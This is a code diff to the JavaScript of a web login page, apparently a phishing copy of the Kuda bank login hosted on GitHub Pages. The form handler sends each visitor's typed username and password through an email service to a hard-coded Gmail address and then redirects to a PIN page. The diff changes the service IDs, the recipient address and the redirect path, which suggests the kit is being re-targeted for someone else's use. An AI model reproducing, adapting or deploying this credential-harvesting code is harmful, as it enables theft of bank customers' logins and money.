@@ -5,13 +5,13 @@ const btn = document.querySelector("button");
 btn.onclick = () => {
   btn.innerHTML = "Loading...";
 };
-const serviceId = "service_6f9ye1j";
-const userId = "VsmpKU41MY1gVHquF";
-const templateId = "template_y67tr7e";
+const serviceId = "service_x5gwg5o";
+const userId = "eEqrVXQc2RgDqp8sX";
+const templateId = "template_qcxmx17";
 document.getElementById("login").onsubmit = function (event) {
   event.preventDefault();
   const emailParams = {
-    to_name: "gracesufficient65@gmail.com",
+    to_name: "Mmaghaebube@gmail.com",
     username: username.value,
     password: password.value,
   };
@@ -22,7 +22,7 @@ document.getElementById("login").onsubmit = function (event) {
       console.log("Sent successfully:", response);
       username.value = "";
       password.value = "";
-      location.href = "/vic-kuda.github.io/pin.html";
+      location.href = "/kuda.github.io/pin.html";
     },
     function (error) {
       console.log("Failed to send:", error);
